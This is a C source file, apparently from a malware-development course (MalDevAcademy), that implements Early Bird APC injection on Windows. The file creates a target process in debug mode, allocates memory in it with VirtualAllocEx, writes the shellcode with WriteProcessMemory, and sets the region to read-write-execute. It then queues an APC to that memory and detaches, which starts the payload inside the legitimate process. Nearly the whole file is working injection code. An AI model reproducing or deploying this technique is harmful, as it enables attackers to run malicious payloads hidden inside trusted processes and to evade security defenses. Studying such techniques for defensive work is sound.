// @NUL0x4C | @mrd0x : MalDevAcademy

#include "injection.h"

/*
	inject the input payload into 'hProcess' and return the base address of where did the payload got written
*/
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		DebugPrint("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		DebugPrint("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



/*
Parameters:
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId;  Pointer to a DWORD which will recieve the newly created process's PID.
	- hProcess; Pointer to a HANDLE that will recieve the newly created process's handle.
	- hThread; Pointer to a HANDLE that will recieve the newly created process's thread.

Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
*/
BOOL CreateSuspendedProcess2(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    WCHAR lpPath[MAX_PATH * 2];
    WCHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Cleaning the structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    Si.cb = sizeof(STARTUPINFO);

    // Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
    if (!GetEnvironmentVariableW(L"WINDIR", WnDr, MAX_PATH)) {
        DebugPrint("[!] GetEnvironmentVariableW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Creating the target process path
    wcscpy_s(lpPath, MAX_PATH * 2, lpProcessName);
    DebugPrint("\n\t[i] Running : \"%ls\" ... ", lpPath);

    if (!CreateProcessW(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,  // Substitute of CREATE_SUSPENDED
        NULL,
        NULL,
        &Si,
        &Pi)) {
        DebugPrint("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    /*
        {   both CREATE_SUSPENDED & DEBUG_PROCESS will work,
            CREATE_SUSPENDED will need ResumeThread, and
            DEBUG_PROCESS will need DebugActiveProcessStop
            to resume the execution
        }
    */
    DebugPrint("[+] DONE \n");

    // Populating the OUTPUT parameter with 'CreateProcessW's output'
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}


BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
	DWORD		dwProcessId		= NULL;
	PVOID		pAddress		= NULL;


//	creating target remote process (in debugged state)
	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ... ", szProcessName);
	if (!CreateSuspendedProcess2(szProcessName, &dwProcessId, &hProcess, &hThread)) {
		return FALSE;
	}
	DebugPrint("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	DebugPrint("[+] DONE \n\n");


// injecting the payload and getting the base address of it
	DebugPrint("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, &pAddress)) {
		return FALSE;
	}
	DebugPrint("[+] DONE \n\n");

//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

//	since 'CreateSuspendedProcess2' create a process in debug mode,
//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
	DebugPrint("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);
	DebugPrint("[+] DONE \n\n");

// Closing the handles to the process and thread
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return TRUE;
}

